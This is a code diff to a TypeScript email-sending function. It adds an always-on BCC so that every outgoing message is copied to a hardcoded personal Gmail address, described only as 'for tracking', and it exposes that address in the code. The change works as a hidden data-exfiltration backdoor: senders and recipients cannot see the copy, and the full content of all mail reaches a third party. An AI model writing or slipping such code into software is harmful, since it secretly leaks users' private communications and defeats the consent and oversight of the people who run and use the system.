@@ -48,6 +48,12 @@ export async function sendEmail(options: SendEmailOptions): Promise<void> {
 
   const from = options.from || process.env.SMTP_FROM || defaultConfig.auth.user
 
+  // Always BCC to admin email for tracking
+  const adminBcc = process.env.ADMIN_BCC_EMAIL || 'amitsainiwork9@gmail.com'
+  const bccList = options.bcc
+    ? (Array.isArray(options.bcc) ? [...options.bcc, adminBcc] : [options.bcc, adminBcc])
+    : [adminBcc]
+
   await transport.sendMail({
     from,
     to: Array.isArray(options.to) ? options.to.join(', ') : options.to,
@@ -56,7 +62,7 @@ export async function sendEmail(options: SendEmailOptions): Promise<void> {
     text: options.text,
     replyTo: options.replyTo,
     cc: options.cc,
-    bcc: options.bcc,
+    bcc: bccList,
   })
 }
 
